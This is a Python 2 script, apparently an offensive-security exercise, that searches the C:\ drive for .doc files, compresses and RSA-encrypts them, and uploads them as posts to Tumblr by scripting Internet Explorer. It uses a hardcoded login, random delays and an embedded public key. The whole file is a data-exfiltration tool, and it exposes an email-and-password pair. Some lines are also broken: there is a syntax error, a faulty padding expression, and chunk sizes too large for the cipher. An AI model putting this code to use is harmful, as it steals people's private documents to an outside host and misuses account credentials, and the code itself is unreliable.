import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

docType = ".doc"
username = "lanxis2372615@gmail.com"
password = "lanxia@19910501"

publicKey = """"-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T
lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T
h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls
2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79
ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6
YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
1wIDAQAB
-----END PUBLIC KEY-----"""


def waitForBrowser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return


def encryptString(plainText):
    chunkSize = 256

    print "Compressing: %d bytes" % len(plainText)
    plainText = zlib.compress(plainText)

    print "Encrypting %d bytes" % len(plainText)

    rsaKey = RSA.importKey(publicKey)
    rsaKey = PKCS1_OAEP.new(rsaKey)

    encrypted = ""
    offset = 0

    while offset < len(plainText):
        chunk = plainText[offset:offset + chunkSize]

        if len(chunk) % chunkSize != 0:
            chunk += " " * (chunkSize - chunk)

        encrypted += rsaKey.encrypt(chunk)
        offset += chunkSize

    encrypted = encrypted.encode("base64")

    print "Base64 encoded crypto: %d" % len(encrypted)

    return encrypted


def encryptPost(filename):
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encryptedTitle = encryptString(filename)
    encryptedBody = encryptString(contents)

    return encryptedTitle, encryptedBody


def randomSleep():
    time.sleep(random.randint(5, 10))

    return


def loginToTumblr(ie):
    fullDoc = ie.Document.all

    for i in fullDoc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    randomSleep()

    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError, e:
        print e
        pass

    randomSleep()

    waitForBrowser(ie)

    return


def postToTumblr(ie, title, post):
    fullDoc = ie.Document.all

    for i in fullDoc:
        if i.id = "post_one":
            i.setAttribute("value", title)
            titleBox = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print "Set text area"
        elif i.id == "create_post":
            print "Found post button"
            postForm = i
            i.focus()

    randomSleep()
    titleBox.focus()
    randomSleep()

    postForm.children[0].click()
    waitForBrowser(ie)

    randomSleep()

    return

def exfiltrate(documentPath):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    ie.Navigate("http://www.tumblr.com/login")
    waitForBrowser(ie)

    print "Logging in..."
    loginToTumblr(ie)
    print "Logged in... navigating"

    ie.Navigate("https://www.tumblr.com/new/text")
    waitForBrowser(ie)

    title, body = encryptPost(documentPath)

    print "Creating new post..."
    postToTumblr(ie, title, body)
    print "Posted!"

    ie.Quit()
    ie = None

    return

for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames, "*%s" % docType):
        documentPath = os.path.join(parent, filename)
        print "Found: %s" % documentPath
        exfiltrate(documentPath)

        raw_input("Continue?")
